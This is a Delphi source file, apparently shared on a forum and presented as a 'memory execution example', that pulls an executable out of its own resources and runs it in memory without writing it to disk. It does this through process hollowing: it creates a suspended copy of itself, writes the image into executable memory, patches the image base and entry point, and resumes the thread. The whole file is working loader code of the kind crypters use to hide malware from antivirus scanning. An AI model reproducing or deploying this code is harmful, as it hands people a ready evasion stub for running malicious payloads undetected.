(*
Memory execution example by KriPpler

This is a little example I made for a project Im working

on that protects an executable file by wrapping it within a

stub files resource and running it directly in memory. This

is nice for when you want to manipulate data without writing

it to disk.

Credits:

Aphex : (CreateProcessEx function)
*)
program execres2;

{$APPTYPE CONSOLE}

{$R 'data.res' 'data.rc'}

uses

  windows;

type

  TSections = array [0..0] of TImageSectionHeader;

function GetAlignedSize(Size: dword; Alignment: dword): dword;

begin

  if ((Size mod Alignment) = 0) then

  begin

    Result := Size;

  end

  else

  begin

    Result := ((Size div Alignment) + 1) * Alignment;

  end;

end;

function ImageSize(Image: pointer): dword;

var

  Alignment: dword;

  ImageNtHeaders: PImageNtHeaders;

  PSections: ^TSections;

  SectionLoop: dword;

begin

  ImageNtHeaders := pointer(dword(dword(Image)) + dword(PImageDosHeader(Image)._lfanew));

  Alignment := ImageNtHeaders.OptionalHeader.SectionAlignment;

  if ((ImageNtHeaders.OptionalHeader.SizeOfHeaders mod Alignment) = 0) then

  begin

    Result := ImageNtHeaders.OptionalHeader.SizeOfHeaders;

  end

  else

  begin

    Result := ((ImageNtHeaders.OptionalHeader.SizeOfHeaders div Alignment) + 1) * Alignment;

  end;

  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do

  begin

    if PSections[SectionLoop].Misc.VirtualSize <> 0 then

    begin

      if ((PSections[SectionLoop].Misc.VirtualSize mod Alignment) = 0) then

      begin

        Result := Result + PSections[SectionLoop].Misc.VirtualSize;

      end

      else

      begin

        Result := Result + (((PSections[SectionLoop].Misc.VirtualSize div Alignment) + 1) * Alignment);

      end;

    end;

  end;

end;

procedure CreateProcessEx(FileMemory: pointer);

var

  BaseAddress, Bytes, HeaderSize, InjectSize,  SectionLoop, SectionSize: dword;

  Context: TContext;

  FileData: pointer;

  ImageNtHeaders: PImageNtHeaders;

  InjectMemory: pointer;

  ProcInfo: TProcessInformation;

  PSections: ^TSections;

  StartInfo: TStartupInfo;

begin

  ImageNtHeaders := pointer(dword(dword(FileMemory)) + dword(PImageDosHeader(FileMemory)._lfanew));

  InjectSize := ImageSize(FileMemory);

  GetMem(InjectMemory, InjectSize);

  try

    FileData := InjectMemory;

    HeaderSize := ImageNtHeaders.OptionalHeader.SizeOfHeaders;

    PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

    for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do

    begin

      if PSections[SectionLoop].PointerToRawData < HeaderSize then HeaderSize := PSections[SectionLoop].PointerToRawData;

    end;

    CopyMemory(FileData, FileMemory, HeaderSize);

    FileData := pointer(dword(FileData) + GetAlignedSize(ImageNtHeaders.OptionalHeader.SizeOfHeaders, ImageNtHeaders.OptionalHeader.SectionAlignment));

    for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do

    begin

      if PSections[SectionLoop].SizeOfRawData > 0 then

      begin

        SectionSize := PSections[SectionLoop].SizeOfRawData;

        if SectionSize > PSections[SectionLoop].Misc.VirtualSize then SectionSize := PSections[SectionLoop].Misc.VirtualSize;

        CopyMemory(FileData, pointer(dword(FileMemory) + PSections[SectionLoop].PointerToRawData), SectionSize);

        FileData := pointer(dword(FileData) + GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));

      end

      else

      begin

        if PSections[SectionLoop].Misc.VirtualSize <> 0 then FileData := pointer(dword(FileData) + GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));

      end;

    end;

    ZeroMemory(@StartInfo, SizeOf(StartupInfo));

    ZeroMemory(@Context, SizeOf(TContext));

    CreateProcess(nil, pchar(ParamStr(0)), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);

    Context.ContextFlags := CONTEXT_FULL;

    GetThreadContext(ProcInfo.hThread, Context);

    ReadProcessMemory(ProcInfo.hProcess, pointer(Context.Ebx + 8), @BaseAddress, 4, Bytes);

    VirtualAllocEx(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectMemory, InjectSize, Bytes);

    WriteProcessMemory(ProcInfo.hProcess, pointer(Context.Ebx + 8), @ImageNtHeaders.OptionalHeader.ImageBase, 4, Bytes);

    Context.Eax := ImageNtHeaders.OptionalHeader.ImageBase + ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;

    SetThreadContext(ProcInfo.hThread, Context);

    ResumeThread(ProcInfo.hThread);

  finally

    FreeMemory(InjectMemory);

  end;

end;

procedure ResourceToMem;

var

  ResInfo: HRSRC;

  ResSize: LongWord;

  Handle: THandle;

  ResData: Pointer;

begin

  //Locate our resource information from within the resource data

  ResInfo := FindResource(SysInit.HInstance, pchar('a01'), RT_RCDATA);

  if ResInfo <> 0 then

  begin

    //Get the size of our resource information

    ResSize := SizeofResource(SysInit.HInstance, ResInfo);

    if ResSize <> 0 then

    begin

      //Get the handle to our resource information

      Handle := LoadResource(SysInit.HInstance, ResInfo);

      if Handle <> 0 then

      begin

        //Store our data into the resource

        ResData := LockResource(Handle);

        //Execute it!

        createprocessex(ResData);

      end;

    end;

end;

end;

begin

    ResourceToMem;

end.
